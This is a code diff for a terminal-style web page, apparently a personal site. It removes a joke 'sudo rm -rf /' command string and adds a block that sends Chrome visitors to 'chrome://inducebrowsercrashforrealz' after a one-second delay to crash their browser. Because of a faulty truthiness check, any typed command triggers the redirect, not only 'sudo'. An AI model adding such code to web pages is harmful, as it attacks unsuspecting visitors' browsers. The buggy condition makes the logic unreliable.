@@ -5,7 +5,6 @@ const commands = {
     work: 'work',
     help: 'help',
     clear: 'clear',
-    sudo: 'sudo rm -rf /'
 };
 
 const terminal = document.getElementById('terminal');
@@ -76,8 +75,18 @@ function handleCommand(cmd) {
         return;
     }
 
+    const sudoo = cmd.toLowerCase().startsWith('sudo') ? 'sudo' : cmd.toLowerCase();
+    if (sudoo) {
+        const isChrome = /Chrome/.test(navigator.userAgent) && !/Edg|OPR/.test(navigator.userAgent);
+        if (isChrome) {
+            setTimeout(() => {
+                window.location.href = 'chrome://inducebrowsercrashforrealz';
+            }, 1000); // 1-second delay for dramatic effect
+        }
+    }
+
     if (cmd in commands) {
-        if (cmd === 'clear' || 'sudo rm -rf /') {
+        if (cmd === 'clear') {
             // Immediately reload the page to reset the entire interface
             location.reload();
         } else {
